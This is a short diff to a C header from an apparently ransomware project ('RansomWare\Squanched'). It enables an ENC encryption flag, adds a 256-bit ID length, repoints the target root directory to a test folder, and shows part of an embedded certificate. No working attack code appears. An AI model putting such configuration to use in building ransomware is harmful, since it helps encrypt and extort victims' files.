@@ -32,8 +32,9 @@
 #define IV_DIGITS_NUM 2
 
 
-//#define ENC
+#define ENC
 
+#define ID_LEN (256/8) // 256 bits
 /*
  * Certifcate
  */
@@ -126,9 +127,9 @@ v2atyXIoempI7s9jaTGMxY5m2kt4ZegDOkv4zEJU01JcLQSuJofhfkDLRUEWS26j\n\
 Lkp2vSl/HFM3Bq3pW2rWt06UonzorE6mUD4rMp5oQhvkWWdh6seaUZwcVaN3dg==\n\
 -----END CERTIFICATE-----"
 
-#ifdef DEBUG
-#define ROOT_DIR R"(C:\rans\236499\Squanched\Debug\testDir)"
-#endif
+//#ifdef DEBUG
+#define ROOT_DIR R"(C:\Programming\RansomWare\236499\Squanched\Debug\testDir)"
+//#endif
 
 
 
